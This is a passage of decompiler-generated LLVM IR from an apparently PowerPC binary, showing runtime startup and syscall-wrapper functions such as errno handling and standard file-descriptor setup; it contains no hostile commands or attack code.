  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_100090a0 = inttoptr i32 %v0_10009080 to i32*
  store i32 %v2_10009088, i32* %v2_100090a0, align 4
  %v0_10009160.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009150

dec_label_pc_100090a8:                            ; preds = %dec_label_pc_10009068
  %v3_100090a8 = load i32, i32* %stack_var_-176, align 4
  %v3_100090b4 = icmp eq i32 %v3_100090a8, 1
  br i1 %v3_100090b4, label %dec_label_pc_100090bc, label %dec_label_pc_100090f0

dec_label_pc_100090bc:                            ; preds = %dec_label_pc_100090a8
  store i32 %v2_10008fb4, i32* %r3.global-to-local, align 4
  store i32 268472520, i32* @lr, align 4
  %v2_100090c4 = call i32 @function_1000987c(i32 %v2_10008fb4, i32 %v2_10008fb4)
  store i32 %v2_100090c4, i32* %r3.global-to-local, align 4
  store i32 %v2_100090c4, i32* @r31, align 4
  %v0_100090cc = call i32 @function_10004e38()
  store i32 %v0_100090cc, i32* %r3.global-to-local, align 4
  store i32 %v0_100090cc, i32* %r29.global-to-local, align 4
  %v1_100090dc = inttoptr i32 %v0_100090cc to i32*
  %v2_100090dc = load i32, i32* %v1_100090dc, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268472552, i32* @lr, align 4
  %v3_100090e4 = call i32 @function_10009a04(i32 2, i32 %v2_10008ff8, i32 0)
  store i32 %v3_100090e4, i32* %r3.global-to-local, align 4
  %v1_100090e8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100090e8 = inttoptr i32 %v1_100090e8 to i32*
  store i32 %v2_100090dc, i32* %v2_100090e8, align 4
  %v0_10009118.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009118

dec_label_pc_100090f0:                            ; preds = %dec_label_pc_100090a8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268472576, i32* @lr, align 4
  %v3_100090fc = call i32 @function_10009a04(i32 2, i32 %v2_10008ff8, i32 0)
  br label %dec_label_pc_1000910c

dec_label_pc_1000910c:                            ; preds = %dec_label_pc_10009014, %dec_label_pc_100090f0
  store i32 %v2_10008fb4, i32* %r3.global-to-local, align 4
  store i32 268472596, i32* @lr, align 4
  %v2_10009110 = call i32 @function_1000987c(i32 %v2_10008fb4, i32 %v2_10008fb4)
  store i32 %v2_10009110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009118

dec_label_pc_10009118:                            ; preds = %dec_label_pc_100090bc, %dec_label_pc_1000910c
  %v0_10009118 = phi i32 [ %v0_10009118.pr, %dec_label_pc_100090bc ], [ %v2_10009110, %dec_label_pc_1000910c ]
  %v3_10009118 = icmp eq i32 %v0_10009118, 0
  br i1 %v3_10009118, label %dec_label_pc_10009144, label %dec_label_pc_10009120

dec_label_pc_10009120:                            ; preds = %dec_label_pc_10009118
  %v3_10009130 = load i32, i32* %stack_var_-440, align 4
  %v0_10009134 = call i32 @__asm_mfcr()
  store i32 %v0_10009134, i32* %r3.global-to-local, align 4
  %v1_10009138 = call i32 @__asm_rlwinm(i32 %v0_10009134, i32 30, i32 31, i32 31)
  %v2_1000913c = add i32 %v3_10009130, %v1_10009138
  store i32 %v2_1000913c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009150

dec_label_pc_10009144:                            ; preds = %dec_label_pc_10009118, %dec_label_pc_10008f90
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009150

dec_label_pc_1000914c:                            ; preds = %dec_label_pc_10008ff8, %dec_label_pc_10009054, %dec_label_pc_10008fd4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009150

dec_label_pc_10009150:                            ; preds = %dec_label_pc_10009144, %dec_label_pc_10009120, %dec_label_pc_10009080, %dec_label_pc_1000914c
  %v0_10009160 = phi i32 [ 0, %dec_label_pc_10009144 ], [ %v2_1000913c, %dec_label_pc_10009120 ], [ %v0_10009160.pre, %dec_label_pc_10009080 ], [ -1, %dec_label_pc_1000914c ]
  ret i32 %v0_10009160

; uselistorder directives
  uselistorder i32 %v1_10009050, { 1, 0 }
  uselistorder i32 %v2_10008ff8, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_10008fd4, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32 %v1_10008fd0, { 1, 0 }
  uselistorder i32 %v2_10008fb4, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 6, 7, 1, 4, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 6, 7, 1, 4, 5, 8, 9 }
  uselistorder i32 (i32, i32)* @function_1000987c, { 1, 0 }
  uselistorder label %dec_label_pc_10009150, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000914c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009118, { 1, 0 }
  uselistorder label %dec_label_pc_1000910c, { 1, 0 }
  uselistorder label %dec_label_pc_10009040.dec_label_pc_10009040_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008fc0.dec_label_pc_10008fc0_crit_edge, { 1, 0 }
}

define i32 @function_10009164(i32 %arg1) local_unnamed_addr {
dec_label_pc_100091b4:
  %v3_100091b8.pre = load i32, i32* @global_var_100104b0.288, align 4
  %v3_100091bc = icmp eq i32 %v3_100091b8.pre, 0
  br i1 %v3_100091bc, label %dec_label_pc_100091cc, label %dec_label_pc_100091c4

dec_label_pc_100091c4:                            ; preds = %dec_label_pc_100091b4
  %v2_100091c8 = load i32, i32* @r4, align 4
  %v3_100091c8 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_100091c8)
  store i32 %v3_100091c8, i32* @r3, align 4
  br label %dec_label_pc_100091cc

dec_label_pc_100091cc:                            ; preds = %dec_label_pc_100091b4, %dec_label_pc_100091c4
  %v3_100091d0 = load i32, i32* @global_var_100104b4.289, align 4
  %v3_100091d4 = icmp eq i32 %v3_100091d0, 0
  br i1 %v3_100091d4, label %dec_label_pc_100091cc.dec_label_pc_100091e4_crit_edge, label %dec_label_pc_100091dc

dec_label_pc_100091cc.dec_label_pc_100091e4_crit_edge: ; preds = %dec_label_pc_100091cc
  %v0_100091f4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100091e4

dec_label_pc_100091dc:                            ; preds = %dec_label_pc_100091cc
  %v2_100091e0 = load i32, i32* @r4, align 4
  %v3_100091e0 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_100091e0)
  br label %dec_label_pc_100091e4

dec_label_pc_100091e4:                            ; preds = %dec_label_pc_100091cc.dec_label_pc_100091e4_crit_edge, %dec_label_pc_100091dc
  %v0_100091f4 = phi i32 [ %v0_100091f4.pre, %dec_label_pc_100091cc.dec_label_pc_100091e4_crit_edge ], [ %v3_100091e0, %dec_label_pc_100091dc ]
  ret i32 %v0_100091f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100091e4, { 1, 0 }
  uselistorder label %dec_label_pc_100091cc, { 1, 0 }
}

define i32 @function_100091f8() local_unnamed_addr {
dec_label_pc_100091f8:
  ret i32 0
}

define i32 @function_10009200() local_unnamed_addr {
dec_label_pc_10009200:
  %v0_10009200 = load i32, i32* @r3, align 4
  ret i32 %v0_10009200
}

define i32 @function_10009204(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009204:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268472872, i32* @lr, align 4
  %v2_10009224 = call i32 @function_100095a8(i32 1, i32 1)
  %v3_10009228 = icmp eq i32 %v2_10009224, -1
  br i1 %v3_10009228, label %dec_label_pc_10009230, label %dec_label_pc_10009250

dec_label_pc_10009230:                            ; preds = %dec_label_pc_10009204
  %v0_10009234 = load i32, i32* @r30, align 4
  store i32 268472900, i32* @lr, align 4
  %v3_10009240 = call i32 @function_100098c4(i32 ptrtoint ([10 x i8]* @global_var_1000f204.290 to i32), i32 %v0_10009234)
  %v1_10009244 = load i32, i32* @r31, align 4
  %v4_10009244 = icmp eq i32 %v3_10009240, %v1_10009244
  br i1 %v4_10009244, label %dec_label_pc_10009250, label %dec_label_pc_1000924c

dec_label_pc_1000924c:                            ; preds = %dec_label_pc_10009230
  %v1_1000924c = call i32 @function_1000b90c(i32 %v3_10009240)
  br label %dec_label_pc_10009250

dec_label_pc_10009250:                            ; preds = %dec_label_pc_10009204, %dec_label_pc_10009230, %dec_label_pc_1000924c
  %v0_10009260 = phi i32 [ %v2_10009224, %dec_label_pc_10009204 ], [ %v3_10009240, %dec_label_pc_10009230 ], [ %v1_1000924c, %dec_label_pc_1000924c ]
  ret i32 %v0_10009260

; uselistorder directives
  uselistorder label %dec_label_pc_10009250, { 2, 1, 0 }
}

define i32 @function_10009264(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009264:
  %v3_10009284 = load i32, i32* @global_var_100104b8.291, align 4
  %v3_10009288 = icmp eq i32 %v3_10009284, 0
  br i1 %v3_10009288, label %dec_label_pc_100092ac, label %dec_label_pc_10009264.dec_label_pc_100092d0_crit_edge

dec_label_pc_10009264.dec_label_pc_100092d0_crit_edge: ; preds = %dec_label_pc_10009264
  %v0_100092e0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100092d0

dec_label_pc_100092ac:                            ; preds = %dec_label_pc_10009264
  store i32 1, i32* @global_var_100104b8.291, align 4
  store i32 4096, i32* @global_var_100104ac.199, align 4
  %v1_100092cc = call i32 @function_100056f0(i32 268457712)
  br label %dec_label_pc_100092d0

dec_label_pc_100092d0:                            ; preds = %dec_label_pc_10009264.dec_label_pc_100092d0_crit_edge, %dec_label_pc_100092ac
  %v0_100092e0 = phi i32 [ %v0_100092e0.pre, %dec_label_pc_10009264.dec_label_pc_100092d0_crit_edge ], [ %v1_100092cc, %dec_label_pc_100092ac ]
  ret i32 %v0_100092e0

; uselistorder directives
  uselistorder label %dec_label_pc_100092d0, { 1, 0 }
}

define i32 @function_100092e4(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100092e4:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_100092fc = mul i32 %arg2, 4
  %v2_10009300 = add i32 %tmp, %v1_100092fc
  %v0_10009304 = load i32, i32* @r9, align 4
  store i32 %v0_10009304, i32* @global_var_100104a4.292, align 4
  %v1_10009308 = add i32 %v2_10009300, 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10009308, i32* @global_var_100104a8.287, align 4
  store i32 %arg6, i32* @global_var_100104b4.289, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_10009328 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10009330 = icmp eq i32 %v1_10009308, %v2_10009328
  br i1 %v4_10009330, label %dec_label_pc_10009338, label %dec_label_pc_1000933c

dec_label_pc_10009338:                            ; preds = %dec_label_pc_100092e4
  store i32 %v2_10009300, i32* @global_var_100104a8.287, align 4
  br label %dec_label_pc_1000933c

dec_label_pc_1000933c:                            ; preds = %dec_label_pc_100092e4, %dec_label_pc_10009338
  %v2_1000933c = ptrtoint i32* %stack_var_-168 to i32
  store i32 268473164, i32* @lr, align 4
  %v3_10009348 = call i32 @function_100071a4(i32 %v2_1000933c, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_100104a8.287, align 4
  br label %dec_label_pc_10009358

dec_label_pc_10009358:                            ; preds = %dec_label_pc_10009358, %dec_label_pc_1000933c
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000933c ], [ %v1_1000935c, %dec_label_pc_10009358 ]
  %v1_10009358 = inttoptr i32 %storemerge to i32*
  %v2_10009358 = load i32, i32* %v1_10009358, align 4
  %v1_1000935c = add i32 %storemerge, 4
  %v3_10009360 = icmp eq i32 %v2_10009358, 0
  br i1 %v3_10009360, label %dec_label_pc_10009368, label %dec_label_pc_10009358

dec_label_pc_10009368:                            ; preds = %dec_label_pc_10009358
  store i32 %v1_1000935c, i32* %r29.global-to-local, align 4
  %v1_1000939412 = inttoptr i32 %v1_1000935c to i32*
  %v2_1000939413 = load i32, i32* %v1_1000939412, align 4
  %v3_1000939816 = icmp eq i32 %v2_1000939413, 0
  br i1 %v3_1000939816, label %dec_label_pc_100093a0, label %dec_label_pc_10009370

dec_label_pc_10009370:                            ; preds = %dec_label_pc_10009368, %dec_label_pc_10009390
  %v0_10009384 = phi i32 [ %v1_10009390, %dec_label_pc_10009390 ], [ %v1_1000935c, %dec_label_pc_10009368 ]
  %v0_10009378 = phi i32 [ %v2_10009394, %dec_label_pc_10009390 ], [ %v2_1000939413, %dec_label_pc_10009368 ]
  %v2_10009370 = icmp ugt i32 %v0_10009378, 14
  br i1 %v2_10009370, label %dec_label_pc_10009390, label %dec_label_pc_10009378

dec_label_pc_10009378:                            ; preds = %dec_label_pc_10009370
  %v1_10009378 = mul i32 %v0_10009378, 8
  %v2_10009380 = add i32 %v1_10009378, %v2_1000933c
  store i32 %v2_10009380, i32* @r3, align 4
  store i32 %v0_10009384, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268473232, i32* @lr, align 4
  %v0_1000938c = call i32 @function_10007108()
  %v0_10009390.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10009390

dec_label_pc_10009390:                            ; preds = %dec_label_pc_10009370, %dec_label_pc_10009378
  %v0_10009390 = phi i32 [ %v0_10009384, %dec_label_pc_10009370 ], [ %v0_10009390.pre, %dec_label_pc_10009378 ]
  %v1_10009390 = add i32 %v0_10009390, 8
  store i32 %v1_10009390, i32* %r29.global-to-local, align 4
  %v1_10009394 = inttoptr i32 %v1_10009390 to i32*
  %v2_10009394 = load i32, i32* %v1_10009394, align 4
  %v3_10009398 = icmp eq i32 %v2_10009394, 0
  br i1 %v3_10009398, label %dec_label_pc_100093a0, label %dec_label_pc_10009370

dec_label_pc_100093a0:                            ; preds = %dec_label_pc_10009390, %dec_label_pc_10009368
  %v1_100093a4 = call i32 @function_1000ba5c(i32 %v2_1000933c)
  store i32 %v1_100093a4, i32* @r3, align 4
  store i32 268473260, i32* @lr, align 4
  %v1_100093a8 = call i32 @function_10009264(i32 %v1_100093a4)
  %v3_100093b0 = icmp eq i32 %tmp27, 0
  br i1 %v3_100093b0, label %dec_label_pc_100093b8, label %dec_label_pc_100093bc

dec_label_pc_100093b8:                            ; preds = %dec_label_pc_100093a0
  br label %dec_label_pc_100093bc

dec_label_pc_100093bc:                            ; preds = %dec_label_pc_100093a0, %dec_label_pc_100093b8
  %v0_100093c4 = phi i32 [ %tmp27, %dec_label_pc_100093a0 ], [ 4096, %dec_label_pc_100093b8 ]
  store i32 %v0_100093c4, i32* @global_var_100104ac.199, align 4
  %v3_100093c8 = icmp eq i32 %tmp26, -1
  br i1 %v3_100093c8, label %dec_label_pc_100093d0, label %dec_label_pc_10009404

dec_label_pc_100093d0:                            ; preds = %dec_label_pc_100093bc
  store i32 268473300, i32* @lr, align 4
  %v1_100093d0 = call i32 @function_10009834(i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 %v1_100093d0, i32* %r29.global-to-local, align 4
  store i32 268473308, i32* @lr, align 4
  %v0_100093d8 = call i32 @function_100097a4()
  %v4_100093dc = icmp eq i32 %v1_100093d0, %v0_100093d8
  br i1 %v4_100093dc, label %dec_label_pc_100093e4, label %dec_label_pc_10009420

dec_label_pc_100093e4:                            ; preds = %dec_label_pc_100093d0
  store i32 268473320, i32* @lr, align 4
  %v1_100093e4 = call i32 @function_100097ec(i32 %v0_100093d8)
  store i32 %v1_100093e4, i32* %r29.global-to-local, align 4
  store i32 268473328, i32* @lr, align 4
  %v0_100093ec = call i32 @function_1000975c()
  %v4_100093f0 = icmp eq i32 %v1_100093e4, %v0_100093ec
  br i1 %v4_100093f0, label %dec_label_pc_100093f8.thread, label %dec_label_pc_10009420

dec_label_pc_100093f8.thread:                     ; preds = %dec_label_pc_100093e4
  br label %dec_label_pc_10009450

dec_label_pc_10009404:                            ; preds = %dec_label_pc_100093bc
  %v4_10009408 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10009408, label %dec_label_pc_10009410, label %dec_label_pc_10009420

dec_label_pc_10009410:                            ; preds = %dec_label_pc_10009404
  br label %dec_label_pc_10009420

dec_label_pc_10009420:                            ; preds = %dec_label_pc_10009410, %dec_label_pc_10009404, %dec_label_pc_100093e4, %dec_label_pc_100093d0
  store i32 268473392, i32* @lr, align 4
  %v2_1000942c = call i32 @function_10009204(i32 0, i32 32768)
  store i32 268473408, i32* @lr, align 4
  %v2_1000943c = call i32 @function_10009204(i32 1, i32 32770)
  store i32 268473424, i32* @lr, align 4
  %v2_1000944c = call i32 @function_10009204(i32 2, i32 32770)
  br label %dec_label_pc_10009450

dec_label_pc_10009450:                            ; preds = %dec_label_pc_100093f8.thread, %dec_label_pc_10009420
  %v0_1000945c = load i32, i32* @r30, align 4
  %v1_1000945c = inttoptr i32 %v0_1000945c to i32*
  %v2_1000945c = load i32, i32* %v1_1000945c, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000945c, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1092) to i32*), align 4
  %v0_1000947c = load i32, i32* @r27, align 4
  store i32 %v0_1000947c, i32* @global_var_100104b0.288, align 4
  br i1 false, label %dec_label_pc_10009484, label %dec_label_pc_100094fc

dec_label_pc_10009484:                            ; preds = %dec_label_pc_10009450, %dec_label_pc_10009484
  br i1 undef, label %dec_label_pc_10009484, label %dec_label_pc_100094fc

dec_label_pc_100094fc:                            ; preds = %dec_label_pc_10009484, %dec_label_pc_10009450
  %v0_100094a8 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_100094a8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000950c = call i32 @function_10004e38()
  %v2_10009514 = inttoptr i32 %v0_1000950c to i32*
  store i32 0, i32* %v2_10009514, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -25916), i32 0), label %dec_label_pc_10009534, label %dec_label_pc_10009528

dec_label_pc_10009528:                            ; preds = %dec_label_pc_100094fc
  %v0_10009528 = call i32 @function_10009ac4()
  %v2_10009530 = inttoptr i32 %v0_10009528 to i32*
  store i32 0, i32* %v2_10009530, align 4
  br label %dec_label_pc_10009534

dec_label_pc_10009534:                            ; preds = %dec_label_pc_100094fc, %dec_label_pc_10009528
  %v0_10009540 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10009540)
  %v0_1000954c = call i32 @function_10008dd8()
  ret i32 %v0_1000954c

; uselistorder directives
  uselistorder i32 %v2_10009394, { 1, 0 }
  uselistorder i32 %v1_10009390, { 2, 1, 0 }
  uselistorder i32 %v1_1000935c, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000933c, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_10008dd8, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* @global_var_100104b0.288, { 1, 0 }
  uselistorder i32 1092, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10009204, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 2, 7, 8, 1, 6, 3, 4, 5 }
  uselistorder i32 14, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10009534, { 1, 0 }
  uselistorder label %dec_label_pc_10009484, { 1, 0 }
  uselistorder label %dec_label_pc_10009450, { 1, 0 }
  uselistorder label %dec_label_pc_100093bc, { 1, 0 }
  uselistorder label %dec_label_pc_10009390, { 1, 0 }
  uselistorder label %dec_label_pc_10009370, { 1, 0 }
  uselistorder label %dec_label_pc_1000933c, { 1, 0 }
}

define i32 @function_10009550(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009550:
  %v0_10009558 = load i32, i32* @lr, align 4
  %v1_10009558 = load i1, i1* @cr0_so, align 1
  %v2_10009558 = xor i1 %v1_10009558, true
  call void @__pseudo_cond_branch(i1 %v2_10009558, i32 %v0_10009558)
  %v0_1000955c = call i32 @function_1000ba78()
  ret i32 %v0_1000955c

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 0 }
}

define i32 @function_10009560(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009560:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009578 = call i32 @__asm_mfcr()
  %v1_1000957c = and i32 %v0_10009578, 268435456
  %v3_1000957c = icmp eq i32 %v1_1000957c, 0
  store i32 %v0_10009578, i32* %r31.global-to-local, align 4
  br i1 %v3_1000957c, label %dec_label_pc_10009594, label %dec_label_pc_10009588

dec_label_pc_10009588:                            ; preds = %dec_label_pc_10009560
  %v0_10009588 = call i32 @function_10004e38()
  %v0_1000958c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000958c = inttoptr i32 %v0_10009588 to i32*
  store i32 %v0_1000958c, i32* %v2_1000958c, align 4
  br label %dec_label_pc_10009594

dec_label_pc_10009594:                            ; preds = %dec_label_pc_10009560, %dec_label_pc_10009588
  %v0_100095a4 = phi i32 [ %v0_10009578, %dec_label_pc_10009560 ], [ -1, %dec_label_pc_10009588 ]
  ret i32 %v0_100095a4

; uselistorder directives
  uselistorder label %dec_label_pc_10009594, { 1, 0 }
}

define i32 @function_100095a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100095a8:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100095bc = add i32 %arg2, -12
  %v2_100095c0 = icmp ugt i32 %v1_100095bc, 2
  %v2_100095c8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100095c8, i32* %stack_var_-32, align 4
  br i1 %v2_100095c0, label %dec_label_pc_100095f4, label %dec_label_pc_100095e4

dec_label_pc_100095e4:                            ; preds = %dec_label_pc_100095a8
  store i32 268473836, i32* @lr, align 4
  %v2_100095e8 = call i32 @function_1000962c(i32 3)
  store i32 %v2_100095e8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009614

dec_label_pc_100095f4:                            ; preds = %dec_label_pc_100095a8
  %v0_100095f8 = call i32 @__asm_mfcr()
  %v1_100095fc = and i32 %v0_100095f8, 268435456
  %v3_100095fc = icmp eq i32 %v1_100095fc, 0
  store i32 %v0_100095f8, i32* %r31.global-to-local, align 4
  br i1 %v3_100095fc, label %dec_label_pc_10009614, label %dec_label_pc_10009608

dec_label_pc_10009608:                            ; preds = %dec_label_pc_100095f4
  %v0_10009608 = call i32 @function_10004e38()
  %v0_1000960c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000960c = inttoptr i32 %v0_10009608 to i32*
  store i32 %v0_1000960c, i32* %v2_1000960c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009614

dec_label_pc_10009614:                            ; preds = %dec_label_pc_100095f4, %dec_label_pc_100095e4, %dec_label_pc_10009608
  %v0_10009618 = phi i32 [ %v0_100095f8, %dec_label_pc_100095f4 ], [ %v2_100095e8, %dec_label_pc_100095e4 ], [ -1, %dec_label_pc_10009608 ]
  ret i32 %v0_10009618

; uselistorder directives
  uselistorder i32 -12, { 4, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10009614, { 2, 0, 1 }
}

define i32 @function_1000962c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000962c:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10009644 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009644, i32* %stack_var_-32, align 4
  %v0_10009660 = call i32 @__asm_mfcr()
  %v1_10009664 = and i32 %v0_10009660, 268435456
  %v3_10009664 = icmp eq i32 %v1_10009664, 0
  store i32 %v0_10009660, i32* %r31.global-to-local, align 4
  br i1 %v3_10009664, label %dec_label_pc_1000967c, label %dec_label_pc_10009670

dec_label_pc_10009670:                            ; preds = %dec_label_pc_1000962c
  %v0_10009670 = call i32 @function_10004e38()
  %v0_10009674 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009674 = inttoptr i32 %v0_10009670 to i32*
  store i32 %v0_10009674, i32* %v2_10009674, align 4
  br label %dec_label_pc_1000967c

dec_label_pc_1000967c:                            ; preds = %dec_label_pc_1000962c, %dec_label_pc_10009670
  %v0_1000968c = phi i32 [ %v0_10009660, %dec_label_pc_1000962c ], [ -1, %dec_label_pc_10009670 ]
  ret i32 %v0_1000968c

; uselistorder directives
  uselistorder label %dec_label_pc_1000967c, { 1, 0 }
}

define i32 @function_10009690(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009690:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_100096a4

dec_label_pc_100096a4:                            ; preds = %dec_label_pc_100096a4.backedge, %dec_label_pc_10009690
  %v0_100096b0 = call i32 @__asm_mfcr()
  %v1_100096b4 = and i32 %v0_100096b0, 268435456
  %v3_100096b4 = icmp eq i32 %v1_100096b4, 0
  store i32 %v0_100096b0, i32* %r31.global-to-local, align 4
  br i1 %v3_100096b4, label %dec_label_pc_100096a4.backedge, label %dec_label_pc_100096c0

dec_label_pc_100096c0:                            ; preds = %dec_label_pc_100096a4
  %v0_100096c0 = call i32 @function_10004e38()
  %v0_100096c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100096c4 = inttoptr i32 %v0_100096c0 to i32*
  store i32 %v0_100096c4, i32* %v2_100096c4, align 4
  br label %dec_label_pc_100096a4.backedge

dec_label_pc_100096a4.backedge:                   ; preds = %dec_label_pc_100096c0, %dec_label_pc_100096a4
  br label %dec_label_pc_100096a4
}

define i32 @function_100096cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100096cc:
  %r31.global-to-local = alloca i32, align 4
  %v0_100096e4 = call i32 @__asm_mfcr()
  %v1_100096e8 = and i32 %v0_100096e4, 268435456
  %v3_100096e8 = icmp eq i32 %v1_100096e8, 0
  store i32 %v0_100096e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100096e8, label %dec_label_pc_10009700, label %dec_label_pc_100096f4

dec_label_pc_100096f4:                            ; preds = %dec_label_pc_100096cc
  %v0_100096f4 = call i32 @function_10004e38()
  %v0_100096f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100096f8 = inttoptr i32 %v0_100096f4 to i32*
  store i32 %v0_100096f8, i32* %v2_100096f8, align 4
  br label %dec_label_pc_10009700

dec_label_pc_10009700:                            ; preds = %dec_label_pc_100096cc, %dec_label_pc_100096f4
  %v0_10009710 = phi i32 [ %v0_100096e4, %dec_label_pc_100096cc ], [ -1, %dec_label_pc_100096f4 ]
  ret i32 %v0_10009710

; uselistorder directives
  uselistorder label %dec_label_pc_10009700, { 1, 0 }
}

define i32 @function_10009714(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009714:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000972c = call i32 @__asm_mfcr()
  %v1_10009730 = and i32 %v0_1000972c, 268435456
  %v3_10009730 = icmp eq i32 %v1_10009730, 0
  store i32 %v0_1000972c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009730, label %dec_label_pc_10009748, label %dec_label_pc_1000973c

dec_label_pc_1000973c:                            ; preds = %dec_label_pc_10009714
  %v0_1000973c = call i32 @function_10004e38()
  %v0_10009740 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009740 = inttoptr i32 %v0_1000973c to i32*
  store i32 %v0_10009740, i32* %v2_10009740, align 4
  br label %dec_label_pc_10009748

dec_label_pc_10009748:                            ; preds = %dec_label_pc_10009714, %dec_label_pc_1000973c
  %v0_10009758 = phi i32 [ %v0_1000972c, %dec_label_pc_10009714 ], [ -1, %dec_label_pc_1000973c ]
  ret i32 %v0_10009758

; uselistorder directives
  uselistorder label %dec_label_pc_10009748, { 1, 0 }
}

define i32 @function_1000975c() local_unnamed_addr {
dec_label_pc_1000975c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009774 = call i32 @__asm_mfcr()
  %v1_10009778 = and i32 %v0_10009774, 268435456
  %v3_10009778 = icmp eq i32 %v1_10009778, 0
  store i32 %v0_10009774, i32* %r31.global-to-local, align 4
  br i1 %v3_10009778, label %dec_label_pc_10009790, label %dec_label_pc_10009784

dec_label_pc_10009784:                            ; preds = %dec_label_pc_1000975c
  %v0_10009784 = call i32 @function_10004e38()
  %v0_10009788 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009788 = inttoptr i32 %v0_10009784 to i32*
  store i32 %v0_10009788, i32* %v2_10009788, align 4
  br label %dec_label_pc_10009790
